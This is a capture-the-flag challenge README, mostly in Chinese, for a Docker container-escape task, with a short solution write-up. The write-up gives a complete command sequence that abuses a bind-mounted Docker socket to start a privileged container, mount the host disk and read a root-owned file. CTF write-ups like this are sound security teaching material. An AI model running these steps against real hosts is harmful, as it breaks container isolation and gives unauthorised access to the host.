## About

这是2022年第三届RWCTF体验赛的容器逃逸题目, 题目作者是 [zh-explorer][1]

## Description of the challenge

Do you want to be a docker escaper? So you need to be patient. It takes minutes for me to get a docker ready for you. I can’t make it faster without kvm, but I think you can do it locally.
from: SpaceSkyNet

## Weriteup

仔细观察user-data中的docker启动命令

```bash
docker run -i -m 128m -v /var/run/docker.sock:/s
```

使用-v 将docker daemon socket映射到了容器中, 因此我们看可以通过 socket 控制容器外的docker, 直接使用-v映射flag或者启动特权容器逃逸即可

```bash
sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.aliyun.com/g" /etc/apt/sources.list
sed -i "s/http:\/\/security.ubuntu.com/http:\/\/mirrors.aliyun.com/g" /etc/apt/sources.list
apt update
DEBIAN_FRONTEND="noninteractive" apt-get -y install docker.io
docker -H unix:///s run -i --privileged ubuntu bash
mkdir /tmp/a
mount /dev/sda1 /tmp/a
chmod 777 /tmp/a/root/flag
cat /tmp/a/root/flag
```

## Deploy

题目部署脚本相关可以参考 [deploy][1] 文件夹

## Reference Link

[1]: https://github.com/zh-explorer
[2]: ./deploy	"题目部署脚本"
[]: 

